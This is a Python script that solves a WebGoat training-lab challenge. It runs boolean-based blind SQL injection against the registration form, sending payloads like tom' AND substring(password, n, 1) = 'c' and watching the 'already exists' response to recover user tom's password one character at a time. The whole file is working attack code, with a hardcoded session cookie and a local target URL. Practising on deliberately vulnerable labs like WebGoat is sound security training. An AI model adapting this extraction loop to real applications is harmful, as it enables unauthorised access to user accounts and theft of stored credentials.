import requests
import os
import sys

url = 'http://localhost:9090/WebGoat/SqlInjectionAdvanced/challenge'

headers = {
    'Cookie':'JSESSIONID=LsefEcWeWysEeu3oEIbjt5vYv-pf4l9wvEtZBBi2'
}

def clear_screen():
    os.system("cls")

def send_request(payload, char):
    global index, cracked_password, char_not_found_in_charset

    data = {
        'username_reg': payload,
        'email_reg': 'tom@webgoat.com',
        'password_reg': 'password',
        'confirm_password_reg': 'password'
    }

    res = requests.put(url, headers=headers, data=data)
    reply = res.json()
    reply = reply['feedback']

    str_to_match = "already exists please try to register with a different username." 

    print(f"Bruteforcing password -> {cracked_password + char}", end='\r')

    if str_to_match in reply:
        index += 1
        cracked_password += char
        char_not_found_in_charset = False
        return True

    else:
        return False

if __name__ == "__main__":
    clear_screen()

    index = 1
    cracked_password = ''
    charset = 'abcdefghijklmnopqrstuvwxyz'

    try:
        while True:
            for char in charset:
                payload = f"tom' AND substring(password, {index}, 1) = '{char}"
                
                char_found = send_request(payload, char)

                if char_found:
                    break

                if not char_found and char == 'z': 
                    print(f"Cracked password - {cracked_password[:-1]}")
                    sys.exit(0) 

    except KeyboardInterrupt:
        print("\nGoodbye!")
        sys.exit(0)